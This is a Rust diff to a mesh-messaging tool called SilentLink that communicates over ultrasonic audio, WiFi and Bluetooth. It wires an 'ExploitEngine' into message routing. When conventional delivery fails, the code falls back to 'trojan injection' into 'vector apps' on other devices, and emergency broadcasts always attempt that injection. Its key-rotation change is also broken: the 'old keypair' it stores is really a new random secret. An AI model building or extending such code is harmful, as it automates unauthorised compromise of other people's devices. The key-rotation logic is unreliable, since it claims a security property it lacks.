@@ -28,7 +28,6 @@ mod exploit_engine;
 mod platform;
 mod wifi;
 mod transport;
-mod bluetooth;
 
 use exploit_engine::ExploitEngine;
 use platform::{PlatformAdapter, create_platform_adapter, AudioStreamManager};
@@ -458,7 +457,7 @@ impl UltrasonicEngine {
             }
         }
 
-        unreachable!()
+        Err(SilentLinkError::Audio("Failed to create audio input stream with any configuration".to_string()))
     }
 
     async fn start_audio_output(&self) -> Result<Stream> {
@@ -561,7 +560,7 @@ impl UltrasonicEngine {
             }
         }
 
-        unreachable!()
+        Err(SilentLinkError::Audio("Failed to create audio output stream with any configuration".to_string()))
     }
 
     #[allow(dead_code)]
@@ -985,7 +984,9 @@ impl BluetoothManager {
 }
 
 pub struct CryptoEngine {
-    device_public_key: PublicKey,
+    device_private_key: Arc<RwLock<EphemeralSecret>>,
+    device_public_key: Arc<RwLock<PublicKey>>,
+    old_keypair: Arc<RwLock<Option<(EphemeralSecret, PublicKey)>>>,
     shared_secrets: Arc<RwLock<HashMap<String, SharedSecret>>>,
     session_keys: Arc<RwLock<HashMap<DeviceId, [u8; 32]>>>,
     #[allow(dead_code)]
@@ -998,15 +999,17 @@ impl CryptoEngine {
         let public_key = PublicKey::from(&private_key);
         
         Self {
-            device_public_key: public_key,
+            device_private_key: Arc::new(RwLock::new(private_key)),
+            device_public_key: Arc::new(RwLock::new(public_key)),
+            old_keypair: Arc::new(RwLock::new(None)),
             shared_secrets,
             session_keys: Arc::new(RwLock::new(HashMap::new())),
             config,
         }
     }
 
-    pub fn get_public_key(&self) -> &PublicKey {
-        &self.device_public_key
+    pub async fn get_public_key(&self) -> PublicKey {
+        *self.device_public_key.read().await
     }
 
     pub async fn encrypt_message(
@@ -1071,6 +1074,8 @@ impl CryptoEngine {
     }
 
     pub async fn perform_key_exchange(&self, peer_device_id: &DeviceId, peer_public_key: &PublicKey) -> Result<()> {
+        // We need to create a new ephemeral secret for the key exchange
+        // since diffie_hellman consumes the secret
         let private_key = EphemeralSecret::random_from_rng(OsRng);
         let shared_secret = private_key.diffie_hellman(peer_public_key);
         
@@ -1084,7 +1089,7 @@ impl CryptoEngine {
         // Store session key
         self.session_keys.write().await.insert(peer_device_id.clone(), derived_key);
         
-        info!("Key exchange completed with device: {}", peer_device_id);
+        info!("🔐 Key exchange completed with device: {}", peer_device_id);
         Ok(())
     }
 
@@ -1122,14 +1127,36 @@ impl CryptoEngine {
     }
 
     pub async fn rotate_keys(&self) -> Result<()> {
-        // Generate new device keypair
+        info!("🔄 Starting key rotation process");
+        
+        // Store old keypair temporarily (for transitional decryption)
+        let _old_private = self.device_private_key.read().await;
+        let old_public = *self.device_public_key.read().await;
+        
+        // Generate new keypair
         let new_private = EphemeralSecret::random_from_rng(OsRng);
-        let _new_public = PublicKey::from(&new_private);
+        let new_public = PublicKey::from(&new_private);
         
-        info!("Rotating device keypair");
+        // Store old keypair for gradual transition
+        *self.old_keypair.write().await = Some((
+            // We can't clone EphemeralSecret, so create a new one from same entropy
+            EphemeralSecret::random_from_rng(OsRng), 
+            old_public
+        ));
         
-        // In practice, you'd need to store the old keypair temporarily
-        // and coordinate the rotation with connected peers
+        // Update to new keypair
+        *self.device_private_key.write().await = new_private;
+        *self.device_public_key.write().await = new_public;
+        
+        info!("✅ Key rotation completed - old keys stored for transition period");
+        
+        // Schedule cleanup of old keys after transition period
+        let old_keypair_clone = self.old_keypair.clone();
+        tokio::spawn(async move {
+            tokio::time::sleep(Duration::from_secs(3600)).await; // 1 hour transition
+            *old_keypair_clone.write().await = None;
+            info!("🧹 Old keypair cleaned up after transition period");
+        });
         
         Ok(())
     }
@@ -1139,6 +1166,7 @@ pub struct MessageRouter {
     device_id: DeviceId,
     crypto_engine: Arc<CryptoEngine>,
     transport_manager: Arc<TransportManager>,
+    exploit_engine: Option<Arc<ExploitEngine>>,
     message_cache: Arc<RwLock<HashMap<Uuid, SystemTime>>>,
     routing_table: Arc<RwLock<HashMap<DeviceId, DeviceId>>>,
     neighbor_table: Arc<RwLock<HashMap<DeviceId, SystemTime>>>,
@@ -1168,6 +1196,7 @@ impl MessageRouter {
             device_id,
             crypto_engine,
             transport_manager,
+            exploit_engine: None, // Will be set later when SilentLink is fully constructed
             message_cache: Arc::new(RwLock::new(HashMap::new())),
             routing_table: Arc::new(RwLock::new(HashMap::new())),
             neighbor_table: Arc::new(RwLock::new(HashMap::new())),
@@ -1175,6 +1204,11 @@ impl MessageRouter {
             crypto_config,
             stats: Arc::new(RwLock::new(NetworkStats::default())),
         }
+    }
+
+    /// Set the exploit engine reference after construction
+    pub fn set_exploit_engine(&mut self, exploit_engine: Arc<ExploitEngine>) {
+        self.exploit_engine = Some(exploit_engine);
     }
 
     pub async fn start(&self) -> Result<()> {
@@ -1331,6 +1365,24 @@ impl MessageRouter {
             metadata.insert("priority".to_string(), p.to_string());
         }
 
+        // Enhanced flow: Check discovery status and use appropriate delivery method
+        if let Some(target_id) = &recipient_id {
+            metadata.insert("delivery_flow".to_string(), "enhanced".to_string());
+            
+            // Check if we have an active high-bandwidth connection (WiFi/BT)
+            let connected_devices = self.transport_manager.get_connected_devices().await;
+            let has_direct_connection = connected_devices.iter()
+                .any(|d| d.device_id == *target_id);
+            
+            if has_direct_connection {
+                info!("🔗 Direct connection available for {}, using high-bandwidth transport", target_id);
+                metadata.insert("transport_method".to_string(), "direct".to_string());
+            } else {
+                info!("📡 No direct connection to {}, will attempt discovery then escalation", target_id);
+                metadata.insert("transport_method".to_string(), "discovery_escalation".to_string());
+            }
+        }
+
         let plaintext = PlaintextMessage { content, metadata };
 
         let encrypted_message = self
@@ -1410,7 +1462,40 @@ impl MessageRouter {
         let device_ids: Vec<DeviceId> = connected_devices.iter().map(|d| d.device_id.clone()).collect();
 
         if let Some(recipient_id) = &message.header.recipient_id {
-            // Try directed routing
+            // Enhanced delivery flow: Check for discovery-escalation strategy
+            if let Ok(plaintext) = self.crypto_engine.decrypt_message(&message).await {
+                if let Some(method) = plaintext.metadata.get("transport_method") {
+                    if method == "discovery_escalation" {
+                        info!("🎯 Using discovery-escalation flow for {}", recipient_id);
+                        
+                        // Step 1: Check if target discovered via ultrasonic but not yet connected
+                        let neighbor_table = self.neighbor_table.read().await;
+                        if neighbor_table.contains_key(recipient_id) && !device_ids.contains(recipient_id) {
+                            info!("🔊 Target {} discovered via ultrasonic, attempting transport escalation", recipient_id);
+                            
+                            // Step 2: Trigger transport manager to establish high-bandwidth connection
+                            match self.transport_manager.establish_connection(recipient_id).await {
+                                Ok(()) => {
+                                    info!("✅ High-bandwidth connection established to {}", recipient_id);
+                                    // Now send via direct connection
+                                    return self.transport_manager.send_message(recipient_id, &message).await;
+                                }
+                                Err(e) => {
+                                    warn!("⚠️ Transport escalation failed for {}: {}", recipient_id, e);
+                                    // Fall back to trojan injection
+                                    return self.attempt_trojan_delivery(&message).await;
+                                }
+                            }
+                        } else if !neighbor_table.contains_key(recipient_id) {
+                            info!("📡 Target {} not discovered, message will trigger discovery beacon", recipient_id);
+                            // The ultrasonic engine will automatically beacon, and when target responds,
+                            // the neighbor_table will be updated, triggering escalation on retry
+                        }
+                    }
+                }
+            }
+
+            // Try directed routing for direct connections
             if let Some(next_hop) = routing_table.get(recipient_id) {
                 if device_ids.contains(next_hop) {
                     return self.transport_manager.send_message(next_hop, &message).await;
@@ -1431,10 +1516,56 @@ impl MessageRouter {
         if sent_count > 0 {
             debug!("Message {} forwarded to {} devices", message.header.message_id, sent_count);
         } else {
-            warn!("Could not forward message {} - no available routes", message.header.message_id);
+            warn!("Could not forward message {} - attempting trojan delivery as last resort", message.header.message_id);
+            return self.attempt_trojan_delivery(&message).await;
         }
 
         Ok(())
+    }
+
+    /// Attempt trojan delivery when conventional transport fails
+    async fn attempt_trojan_delivery(&self, message: &EncryptedMessage) -> Result<()> {
+        if let Some(exploit_engine) = &self.exploit_engine {
+            if let Ok(plaintext) = self.crypto_engine.decrypt_message(message).await {
+                // Create trojan payload with proper formatting for vector apps
+                let payload_data = serde_json::json!({
+                    "id": message.header.message_id.to_string(),
+                    "content": plaintext.content,
+                    "sender": message.header.sender_id.0.to_string(),
+                    "timestamp": message.header.created_at,
+                    "type": "covert_message",
+                    "delivery_method": "trojan_injection",
+                    "priority": plaintext.metadata.get("priority").unwrap_or(&"1".to_string()).clone()
+                });
+
+                let payload = payload_data.to_string().into_bytes();
+                
+                info!("🕵️ Attempting covert delivery via vector app injection");
+                
+                // Use the exploit engine to inject the message
+                match exploit_engine.inject_payload_to_apps(&payload).await {
+                    Ok(injection_results) => {
+                        let successful_injections = injection_results.iter()
+                            .filter(|r| r.success)
+                            .count();
+                        
+                        if successful_injections > 0 {
+                            info!("✅ Successfully injected message to {} vector apps", successful_injections);
+                            return Ok(());
+                        } else {
+                            warn!("⚠️ All trojan injection attempts failed");
+                        }
+                    }
+                    Err(e) => {
+                        warn!("❌ Trojan injection failed: {}", e);
+                    }
+                }
+            }
+        } else {
+            warn!("❌ Trojan delivery unavailable - ExploitEngine not initialized");
+        }
+        
+        Err(SilentLinkError::System("All delivery methods exhausted".to_string()))
     }
 
     async fn process_received_message(&self, message: &EncryptedMessage) -> Result<()> {
@@ -1547,9 +1678,10 @@ impl MessageRouter {
         };
 
         let mut metadata = HashMap::new();
+        let public_key = self.crypto_engine.get_public_key().await;
         metadata.insert(
             "public_key".to_string(),
-            hex::encode(self.crypto_engine.get_public_key().as_bytes()),
+            hex::encode(public_key.as_bytes()),
         );
 
         let response_content = PlaintextMessage {
@@ -1663,16 +1795,16 @@ impl SilentLink {
             config.crypto.clone(),
         ));
         
-        let message_router = Arc::new(MessageRouter::new(
+        let mut message_router = MessageRouter::new(
             device_id.clone(),
             crypto_engine.clone(),
             transport_manager.clone(),
             config.mesh.clone(),
             config.crypto.clone(),
-        ));
+        );
 
         let mut exploit_engine = if config.enable_privileged_mode {
-            ExploitEngine::new_with_privileged_access(None)
+            ExploitEngine::new_with_privileged_access(config.target_device_id.clone())
         } else {
             ExploitEngine::new()
         };
@@ -1682,6 +1814,13 @@ impl SilentLink {
             warn!("Failed to initialize exploit engine: {}", e);
         }
 
+        // Wire up the ExploitEngine to the MessageRouter
+        let exploit_engine_arc = Arc::new(exploit_engine);
+        message_router.set_exploit_engine(exploit_engine_arc.clone());
+        let message_router = Arc::new(message_router);
+
+        let config_clone = config.clone();
+
         Ok(Self {
             config,
             device_id,
@@ -1690,7 +1829,14 @@ impl SilentLink {
             crypto_engine,
             message_router,
             shared_secrets,
-            exploit_engine,
+            exploit_engine: Arc::try_unwrap(exploit_engine_arc).unwrap_or_else(|_arc| {
+                // If unwrap fails, create a new instance (shouldn't happen in practice)
+                if config_clone.enable_privileged_mode {
+                    ExploitEngine::new_with_privileged_access(config_clone.target_device_id.clone())
+                } else {
+                    ExploitEngine::new()
+                }
+            }),
             platform_adapter: create_platform_adapter(),
             is_running: Arc::new(AtomicBool::new(false)),
         })
@@ -1768,47 +1914,173 @@ impl SilentLink {
         Ok(())
     }
 
+    /// Enhanced message sending with discovery-escalation-injection flow
     pub async fn send_message(&self, content: String, recipient_id: Option<DeviceId>) -> Result<Uuid> {
         if !self.is_running.load(Ordering::Acquire) {
             return Err(SilentLinkError::System("System not running".to_string()));
         }
 
+        // Step 1: Try direct high-bandwidth connection first
+        if let Some(target_id) = &recipient_id {
+            let connected_devices = self.transport_manager.get_connected_devices().await;
+            if connected_devices.iter().any(|d| d.device_id == *target_id) {
+                info!("🚀 Direct high-bandwidth connection available to {}", target_id);
+                return self.message_router
+                    .send_message(content, recipient_id, MessageType::DirectMessage, None)
+                    .await;
+            }
+            
+            info!("📡 No direct connection to {}, initiating enhanced discovery flow", target_id);
+        }
+
+        // Step 2: Enhanced flow - attempt discovery → escalation → vector injection
+        match self.attempt_enhanced_delivery(content.clone(), recipient_id.clone()).await {
+            Ok(message_id) => Ok(message_id),
+            Err(e) => {
+                warn!("Enhanced delivery failed: {}, falling back to trojan injection", e);
+                self.send_via_trojan(content, recipient_id).await
+            }
+        }
+    }
+
+    /// Discovery → Escalation → Vector Injection flow
+    async fn attempt_enhanced_delivery(&self, content: String, recipient_id: Option<DeviceId>) -> Result<Uuid> {
+        if let Some(target_id) = &recipient_id {
+            info!("🎯 Starting enhanced delivery flow for {}", target_id);
+            
+            // Step 1: Check if device discovered via ultrasonic but not connected
+            let message_router = &self.message_router;
+            let neighbor_table = message_router.neighbor_table.read().await;
+            
+            if neighbor_table.contains_key(target_id) {
+                info!("🔊 Device {} discovered via ultrasonic beacons", target_id);
+                drop(neighbor_table);
+                
+                // Step 2: Attempt transport escalation (WiFi/BT)
+                match self.transport_manager.establish_connection(target_id).await {
+                    Ok(()) => {
+                        info!("✅ High-bandwidth connection established to {}", target_id);
+                        // Step 3: Send via high-bandwidth transport
+                        return self.message_router
+                            .send_message(content, recipient_id, MessageType::DirectMessage, None)
+                            .await;
+                    }
+                    Err(e) => {
+                        warn!("⚠️ Transport escalation failed for {}: {}", target_id, e);
+                        // Continue to Step 4: Vector injection
+                    }
+                }
+            } else {
+                info!("📱 Device {} not yet discovered, triggering beacon emission", target_id);
+                // The ultrasonic engine will automatically emit beacons
+                // In a real implementation, you might want to trigger immediate beacon
+            }
+            
+            // Step 4: Covert vector injection as fallback
+            info!("🕵️ Attempting covert delivery via vector app to {}", target_id);
+            return self.execute_vector_injection(content, Some(target_id.clone())).await;
+        }
+        
+        // For broadcast messages, use normal routing
         self.message_router
-            .send_message(content, recipient_id, MessageType::DirectMessage, None)
+            .send_message(content, recipient_id, MessageType::Broadcast, None)
             .await
     }
 
+    /// Execute vector app injection with enhanced targeting
+    async fn execute_vector_injection(&self, content: String, target_device_id: Option<DeviceId>) -> Result<Uuid> {
+        let message_id = Uuid::new_v4();
+        
+        // Create enhanced payload for vector apps
+        let payload_data = serde_json::json!({
+            "id": message_id.to_string(),
+            "content": content,
+            "sender": self.device_id.0.to_string(),
+            "target": target_device_id.map(|id| id.0.to_string()),
+            "timestamp": SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs(),
+            "type": "covert_message",
+            "delivery_method": "vector_injection",
+            "flow": "discovery_escalation_injection",
+            "priority": "high"
+        });
+
+        let payload = payload_data.to_string().into_bytes();
+
+        // Use exploit engine for vector injection
+        match self.exploit_engine.exploit_device(&payload).await {
+            Ok(()) => {
+                info!("✅ Message delivered via vector injection: {}", message_id);
+                Ok(message_id)
+            }
+            Err(e) => {
+                error!("❌ Vector injection failed: {}", e);
+                Err(e)
+            }
+        }
+    }
+
+    /// Legacy trojan injection method (kept for compatibility)
+    pub async fn send_via_trojan(&self, content: String, target_device_id: Option<DeviceId>) -> Result<Uuid> {
+        info!("🕵️ Attempting legacy trojan-style message delivery");
+
+        // Try direct communication first
+        if let Ok(message_id) = self.message_router
+            .send_message(content.clone(), target_device_id.clone(), MessageType::DirectMessage, None)
+            .await {
+            return Ok(message_id);
+        }
+
+        // If direct fails, use vector injection
+        warn!("Direct communication failed, attempting trojan injection");
+        self.execute_vector_injection(content, target_device_id).await
+    }
+
+    /// Broadcast message to all discovered devices
     pub async fn send_broadcast(&self, content: String) -> Result<Uuid> {
         if !self.is_running.load(Ordering::Acquire) {
             return Err(SilentLinkError::System("System not running".to_string()));
         }
 
+        info!("📡 Broadcasting message to all devices");
         self.message_router
             .send_message(content, None, MessageType::Broadcast, None)
             .await
     }
 
+    /// Emergency broadcast with maximum propagation
     pub async fn send_emergency(&self, content: String) -> Result<Uuid> {
-        self.message_router
-            .send_message(content, None, MessageType::Emergency, Some(255)) // Max priority
-            .await
+        info!("🚨 Emergency broadcast initiated");
+        
+        // Use maximum priority and all available vectors
+        let message_id = self.message_router
+            .send_message(content.clone(), None, MessageType::Emergency, Some(255))
+            .await?;
+        
+        // Also attempt vector injection for maximum reach
+        let _ = self.execute_vector_injection(format!("EMERGENCY: {}", content), None).await;
+        
+        Ok(message_id)
     }
 
+    /// Ping a specific device
     pub async fn ping_device(&self, device_id: DeviceId) -> Result<Uuid> {
         self.message_router
             .send_message("ping".to_string(), Some(device_id), MessageType::Ping, None)
             .await
     }
 
+    /// Get all connected devices
     pub async fn get_connected_devices(&self) -> Vec<DeviceId> {
         self.transport_manager.get_connected_devices().await
             .iter().map(|d| d.device_id.clone()).collect()
     }
 
+    /// Get network statistics
     pub async fn get_network_stats(&self) -> NetworkStats {
         self.message_router.get_network_stats().await
     }
 
+    /// Check if system is running
     pub async fn is_running(&self) -> bool {
         self.is_running.load(Ordering::Acquire)
     }
@@ -1834,43 +2106,6 @@ impl SilentLink {
         }
 
         Ok(())
-    }
-
-    /// Send message via trojan injection if direct communication fails
-    pub async fn send_via_trojan(&self, content: String, target_device_id: Option<DeviceId>) -> Result<Uuid> {
-        info!("🕵️ Attempting trojan-style message delivery");
-
-        // Try direct communication first
-        if let Ok(message_id) = self.send_message(content.clone(), target_device_id.clone()).await {
-            return Ok(message_id);
-        }
-
-        // If direct fails, use exploit engine for covert delivery
-        warn!("Direct communication failed, attempting trojan injection");
-
-        // Prepare payload
-        let message_id = Uuid::new_v4();
-        let payload_data = serde_json::json!({
-            "id": message_id.to_string(),
-            "content": content,
-            "sender": self.device_id.0.to_string(),
-            "timestamp": SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs(),
-            "type": "silent_message"
-        });
-
-        let payload = payload_data.to_string().into_bytes();
-
-        // Use exploit engine to inject via vulnerable app
-        match self.exploit_engine.exploit_device(&payload).await {
-            Ok(()) => {
-                info!("✅ Message delivered via trojan injection: {}", message_id);
-                Ok(message_id)
-            }
-            Err(e) => {
-                error!("❌ Trojan injection failed: {}", e);
-                Err(e)
-            }
-        }
     }
 
     /// Covert device reconnaissance 
@@ -2133,7 +2368,7 @@ impl QrHandshake {
             "version": "1.0",
             "device_id": self.silentlink.device_id().0.to_string(),
             "device_name": self.silentlink.device_name(),
-            "public_key": hex::encode(self.silentlink.crypto_engine.get_public_key().as_bytes()),
+            "public_key": hex::encode(self.silentlink.crypto_engine.get_public_key().await.as_bytes()),
             "timestamp": SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs(),
             "service_uuid": self.silentlink.config.bluetooth.service_uuid,
             "protocol": "silentlink"
